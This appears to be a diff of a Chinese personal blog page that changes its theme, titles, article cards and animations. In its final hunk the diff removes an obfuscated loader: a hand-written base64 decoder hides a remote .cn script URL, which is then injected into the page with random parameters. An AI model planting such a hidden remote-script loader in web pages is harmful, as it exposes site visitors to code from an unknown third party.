@@ -3,16 +3,20 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>思维流：数字画布</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>浮光掠影 - 我的数字日志</title>
     <style>
         body {
             overflow: hidden;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Lato', sans-serif;
+            /* 现代无衬线字体 */
             margin: 0;
             padding: 0;
-            background-color: #1E2A38;
-            color: #E0E6ED;
+            background-color: #EBF4F8;
+            /* 极浅淡蓝色背景 */
+            color: #4A6572;
+            /* 柔和的深青色文本 */
             line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -26,189 +30,146 @@
         }
 
         header {
-            background-color: #1E2A38;
-            padding: 60px 20px;
+            background-color: #FFFFFF;
+            /* 纯白色头部背景 */
+            padding: 50px 20px;
             text-align: center;
+            border-bottom: 2px solid #A2D9CE;
+            /* 强调色细边框 */
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
             position: relative;
             overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
-            border-bottom: 5px solid #FF6F61;
-        }
-
-        header::before {
-            content: '';
-            position: absolute;
-            top: -50px;
-            left: -50px;
-            width: 250px;
-            height: 250px;
-            background: #F0E68C;
-            border-radius: 60% 40% 30% 70% / 60% 30% 70% 40%;
-            transform: rotate(30deg);
-            opacity: 0.15;
-            z-index: 0;
-        }
-
-        header::after {
-            content: '';
-            position: absolute;
-            bottom: -70px;
-            right: -70px;
-            width: 350px;
-            height: 350px;
-            background: #FF6F61;
-            border-radius: 40% 60% 60% 40% / 40% 40% 60% 60%;
-            transform: rotate(-50deg);
-            opacity: 0.1;
-            z-index: 0;
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 3.5em;
-            color: #FF6F61;
-            letter-spacing: 4px;
+            font-family: 'Raleway', sans-serif;
+            /* 优雅标题字体 */
+            font-size: 3em;
+            color: #2C3E50;
+            /* 深色标题 */
+            letter-spacing: 1px;
             text-transform: uppercase;
-            text-shadow: 0 0 20px rgba(255, 111, 97, 0.6);
-            position: relative;
-            z-index: 1;
         }
 
-        #tagline {
-            font-family: 'Playfair Display', serif;
-            font-size: 1.4em;
-            color: #F0E68C;
+        header p {
+            font-size: 1.2em;
+            color: #78909C;
+            /* 柔和灰色副标题 */
             margin-top: 15px;
-            position: relative;
-            z-index: 1;
-            min-height: 1.4em;
-            display: inline-block;
         }
 
         nav {
-            background-color: #2C3E50;
+            background-color: #FFFFFF;
+            text-align: center;
             padding: 15px 0;
-            margin-top: 40px;
+            margin-top: 30px;
             border-radius: 10px;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
             position: sticky;
             top: 20px;
             z-index: 1000;
-            width: 90%;
-            /* Adjusted width for better mobile fit */
-            max-width: 700px;
-            margin-left: auto;
-            margin-right: auto;
-            /* Removed display: flex from nav itself */
         }
 
         nav ul {
             list-style: none;
-            padding: 0 10px;
-            /* Added horizontal padding */
+            padding: 0;
             margin: 0;
             display: flex;
             justify-content: center;
-            /* Centered items when wrapped */
             flex-wrap: wrap;
-            /* Allow items to wrap */
-            gap: 10px;
-            /* Consistent spacing between items */
         }
 
         nav ul li {
-            /* Margin handled by gap now */
+            margin: 0 20px;
         }
 
         nav ul li a {
-            background-color: transparent;
-            color: #E0E6ED;
+            color: #4A6572;
+            /* 默认文字颜色 */
             text-decoration: none;
-            padding: 10px 20px;
-            /* Slightly adjusted padding for better fit */
-            border-radius: 8px;
-            border: 2px solid #AAB8C2;
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease, border-color 0.3s ease;
+            padding: 10px 0;
+            position: relative;
             display: inline-block;
-            font-weight: bold;
-            font-size: 1em;
-            text-transform: uppercase;
+            font-weight: 600;
+            font-size: 1.05em;
+            transition: color 0.3s ease;
+        }
+
+        nav ul li a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 3px;
+            background-color: #A2D9CE;
+            /* 强调色 */
+            bottom: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            transition: width 0.3s ease;
+        }
+
+        nav ul li a:hover::after,
+        nav ul li a:focus::after {
+            width: 100%;
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: #FF6F61;
-            color: #1E2A38;
-            transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(255, 111, 97, 0.4);
-            border-color: #FF6F61;
+            color: #A2D9CE;
+            /* 强调色 */
         }
 
         main {
-            padding-top: 40px;
+            padding-top: 30px;
         }
 
         .article-card {
-            background-color: #2C3E50;
-            margin-bottom: 50px;
-            padding: 40px;
+            background-color: #FFFFFF;
+            margin-bottom: 40px;
+            padding: 35px;
             border-radius: 15px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
-            border-left: 8px solid #F0E68C;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
+            opacity: 0;
+            /* 初始隐藏 */
+            transform: translateY(20px);
+            /* 初始位置 */
+        }
+
+        .article-card.fade-in {
+            opacity: 1;
+            transform: translateY(0);
+            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
         }
 
         .article-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
-        }
-
-        .article-card::before {
-            content: '';
-            position: absolute;
-            top: -20px;
-            right: -20px;
-            width: 100px;
-            height: 100px;
-            background: #FF6F61;
-            border-radius: 30% 70% 50% 50% / 50% 50% 70% 30%;
-            opacity: 0.08;
-            transform: rotate(15deg);
-            z-index: 0;
+            transform: translateY(-8px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
         }
 
         .article-card h2 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2.5em;
-            color: #FF6F61;
+            font-family: 'Raleway', sans-serif;
+            font-size: 2.2em;
+            color: #2C3E50;
             margin-top: 0;
-            margin-bottom: 20px;
-            border-bottom: 1px dashed #AAB8C2;
-            padding-bottom: 10px;
-            position: relative;
-            z-index: 1;
+            margin-bottom: 15px;
+            line-height: 1.3;
         }
 
         .article-card .date {
-            font-size: 1em;
-            color: #AAB8C2;
-            margin-bottom: 25px;
+            font-size: 0.9em;
+            color: #90A4AE;
+            margin-bottom: 20px;
             display: block;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            position: relative;
-            z-index: 1;
+            border-bottom: 1px dashed #CFD8DC;
+            padding-bottom: 10px;
         }
 
         .article-card p {
-            font-size: 1.1em;
-            color: #E0E6ED;
-            margin-bottom: 30px;
-            position: relative;
-            z-index: 1;
+            font-size: 1.05em;
+            color: #546E7A;
+            margin-bottom: 25px;
         }
 
         .article-card img {
@@ -217,128 +178,110 @@
             display: block;
             margin: 30px auto;
             border-radius: 10px;
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
-            border: 3px solid #F0E68C;
-            position: relative;
-            z-index: 1;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border: 2px solid #CFD8DC;
+            /* 柔和边框 */
         }
 
         .read-more {
             display: inline-block;
-            background-color: #FF6F61;
-            color: #FFFFFF;
-            padding: 15px 35px;
-            border-radius: 50px;
+            background-color: #A2D9CE;
+            /* 强调色按钮 */
+            color: #2C3E50;
+            /* 深色文字 */
+            padding: 12px 28px;
+            border-radius: 8px;
             text-decoration: none;
             font-weight: bold;
-            font-size: 1.1em;
-            text-transform: uppercase;
-            letter-spacing: 1px;
             transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            box-shadow: 0 5px 15px rgba(255, 111, 97, 0.3);
-            border: none;
-            position: relative;
-            z-index: 1;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
         }
 
         .read-more:hover {
-            background-color: #E65C5C;
-            transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(255, 111, 97, 0.5);
+            background-color: #88C0B5;
+            /* 悬停深色 */
+            transform: translateY(-3px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
         }
 
         footer {
-            background-color: #1E2A38;
-            color: #AAB8C2;
-            padding: 50px 0;
+            background-color: #2C3E50;
+            /* 深色页脚背景 */
+            color: #EBF4F8;
+            /* 浅色文本 */
+            padding: 40px 0;
             text-align: center;
-            font-size: 0.95em;
-            margin-top: 60px;
-            border-top: 5px solid #F0E68C;
-            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.4);
-            position: relative;
-            overflow: hidden;
-        }
-
-        footer::before {
-            content: '';
-            position: absolute;
-            bottom: -50px;
-            left: -50px;
-            width: 200px;
-            height: 200px;
-            background: #FF6F61;
-            border-radius: 70% 30% 60% 40% / 30% 70% 40% 60%;
-            transform: rotate(40deg);
-            opacity: 0.08;
-            z-index: 0;
+            font-size: 0.9em;
+            margin-top: 50px;
+            border-top: 2px solid #A2D9CE;
+            /* 强调色边框 */
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
         }
 
         .social-links a {
-            color: #E0E6ED;
+            color: #EBF4F8;
             text-decoration: none;
             margin: 0 20px;
-            font-size: 1.8em;
+            font-size: 1.4em;
             transition: color 0.3s ease, transform 0.2s ease;
-            position: relative;
-            z-index: 1;
         }
 
         .social-links a:hover {
-            color: #F0E68C;
-            transform: translateY(-5px) scale(1.1);
+            color: #A2D9CE;
+            /* 强调色 */
+            transform: translateY(-3px) scale(1.1);
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <header>
         <div class="container">
-            <h1>思维流</h1>
-            <p id="tagline"></p>
+            <h1>浮光掠影</h1>
+            <p>捕捉生活中的灵感瞬间</p>
         </div>
     </header>
 
     <div class="container">
         <nav id="mainNav">
             <ul>
-                <li><a href="#latest-thoughts">最新思想</a></li>
-                <li><a href="#creative-works">创意作品</a></li>
+                <li><a href="#latest-entries">最新日志</a></li>
+                <li><a href="#categories">分类</a></li>
                 <li><a href="#about-me">关于我</a></li>
                 <li><a href="#contact">联系</a></li>
             </ul>
         </nav>
 
         <main>
-            <section id="latest-thoughts">
-                <h2>最新思想</h2>
+            <section id="latest-entries">
+                <h2>最新日志</h2>
                 <div class="article-list">
                     <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=1&seed=abstract-thought-01" alt="抽象思考"
+                        <img src="https://picsum.photos/300/200?random=1&tag=sky-clouds-alpha" alt="天空与云朵"
                             class="random-image">
-                        <h2>意识的边界：探索数字与现实的交织</h2>
+                        <h2>云端漫步：数字世界的遐想</h2>
                         <span class="date">2025年07月29日</span>
-                        <p>在数字信息无处不在的今天，我们如何定义“现实”？本文将探讨意识、技术与感官体验之间的复杂关系。</p>
-                        <a href="#" class="read-more">深入思考</a>
+                        <p>在数字的海洋中，思绪如同云朵般自由飘荡。记录下这些无拘无束的遐想，是通往内心深处的旅程。</p>
+                        <a href="#" class="read-more">阅读更多</a>
                     </div>
 
                     <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=2&seed=geometric-patterns-02" alt="几何图案"
+                        <img src="https://picsum.photos/300/200?random=2&tag=minimalist-desk-beta" alt="极简桌面"
                             class="random-image">
-                        <h2>几何之美：代码中的秩序与混沌</h2>
+                        <h2>极简生活美学：桌面整理的艺术</h2>
                         <span class="date">2025年07月25日</span>
-                        <p>代码是逻辑的艺术，而几何图形则是其视觉表达。本文将展示如何在编程中创造出令人惊叹的几何美学。</p>
-                        <a href="#" class="read-more">探索几何</a>
+                        <p>一个整洁的桌面，往往能带来清晰的思维。本文分享了我的极简桌面整理心得，以及它如何影响我的工作效率。</p>
+                        <a href="#" class="read-more">阅读更多</a>
                     </div>
 
                     <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=3&seed=fluid-motion-03" alt="流体运动"
+                        <img src="https://picsum.photos/300/200?random=3&tag=coffee-art-gamma" alt="咖啡拉花"
                             class="random-image">
-                        <h2>流体设计：用户体验的无缝流动</h2>
+                        <h2>咖啡与灵感：味蕾上的创作</h2>
                         <span class="date">2025年07月18日</span>
-                        <p>一个优秀的用户界面，其设计应像流体般自然。本文将解析如何通过动画和交互，实现无缝的用户体验。</p>
-                        <a href="#" class="read-more">体验流动</a>
+                        <p>一杯香醇的咖啡，不仅是味蕾的享受，更是灵感的源泉。探索咖啡制作的艺术，以及它如何激发我的创意。</p>
+                        <a href="#" class="read-more">阅读更多</a>
                     </div>
                 </div>
             </section>
@@ -347,11 +290,11 @@
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 思维流. 数字版权所有.</p>
+            <p>&copy; 2025 浮光掠影. 版权所有.</p>
             <div class="social-links">
-                <a href="#" target="_blank">🔗</a> |
-                <a href="#" target="_blank">✨</a> |
-                <a href="#" target="_blank">💡</a>
+                <a href="#" target="_blank">微博</a> |
+                <a href="#" target="_blank">知乎</a> |
+                <a href="#" target="_blank">简书</a>
             </div>
         </div>
     </footer>
@@ -383,43 +326,26 @@
                 });
             });
 
-            const taglineElement = document.getElementById('tagline');
-            const taglines = [
-                "捕捉灵感瞬间",
-                "探索未知领域",
-                "构建数字世界",
-                "分享独特视角"
-            ];
-            let taglineIndex = 0;
-            let charIndex = 0;
-            let isDeleting = false;
-            let typingSpeed = 100;
-            let deletingSpeed = 50;
-            let delayBetweenTaglines = 1500;
+            const articleCards = document.querySelectorAll('.article-card');
 
-            function typeWriter() {
-                const currentTagline = taglines[taglineIndex];
-                if (isDeleting) {
-                    taglineElement.textContent = currentTagline.substring(0, charIndex--);
-                } else {
-                    taglineElement.textContent = currentTagline.substring(0, charIndex++);
-                }
+            const observerOptions = {
+                root: null,
+                rootMargin: '0px',
+                threshold: 0.2
+            };
 
-                let speed = isDeleting ? deletingSpeed : typingSpeed;
+            const observer = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('fade-in');
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, observerOptions);
 
-                if (!isDeleting && charIndex === currentTagline.length + 1) {
-                    speed = delayBetweenTaglines;
-                    isDeleting = true;
-                } else if (isDeleting && charIndex === -1) {
-                    isDeleting = false;
-                    taglineIndex = (taglineIndex + 1) % taglines.length;
-                    speed = typingSpeed;
-                }
-
-                setTimeout(typeWriter, speed);
-            }
-
-            typeWriter();
+            articleCards.forEach(card => {
+                observer.observe(card);
+            });
         });
     </script>
     <script>
@@ -427,53 +353,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly95NnQ4cjBlLmpudG16by5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
